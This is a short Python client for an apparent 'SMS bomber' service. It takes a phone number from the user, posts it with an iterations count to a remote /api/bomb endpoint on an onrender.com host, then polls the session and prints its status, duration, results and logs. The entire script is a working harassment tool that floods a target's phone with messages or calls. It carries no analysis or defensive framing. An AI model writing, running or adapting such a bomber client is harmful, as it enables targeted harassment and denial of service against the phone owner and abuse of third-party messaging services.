import requests,time,re

BASE="https://aivoratechbomber-2077.onrender.com"

phone=input("Enter Number : ").strip()

PAYLOAD={
    "phone": phone,
    "ip":"192.168.1.1",
    "iterations":5
}

s=requests.Session()
s.headers.update({"User-Agent":"Mozilla/5.0","Content-Type":"application/json"})

print("[*] Sending POST request")
post=s.post(f"{BASE}/api/bomb",json=PAYLOAD)
print("[+] POST status:",post.status_code)
print("[+] POST body:",post.text)

sid=None
try:
    sid=post.json().get("session_id") or post.json().get("id")
except:
    m=re.search(r'"session[_-]?id"\s*:\s*(\d+)',post.text)
    sid=m.group(1) if m else None

if not sid:
    print("[-] Session ID not found")
    exit()

print("[+] Session ID extracted:",sid)
print("[*] Polling live status")

while True:
    r=s.get(f"{BASE}/api/session/{sid}")
    print("[+] GET status:",r.status_code)

    try:
        j=r.json()
    except:
        print("[-] Invalid JSON")
        break

    print("STATUS :",j.get("status"))
    print("TIME   :",j.get("duration"))
    print("RESULT :",j.get("results"))
    logs=j.get("logs",[])
    if logs:
        print("LAST LOG:",logs[-1])
    print("-"*30)

    if j.get("status","").lower() not in ("running","in_progress"):
        print("[✓] Finished")
        break

    time.sleep(2)
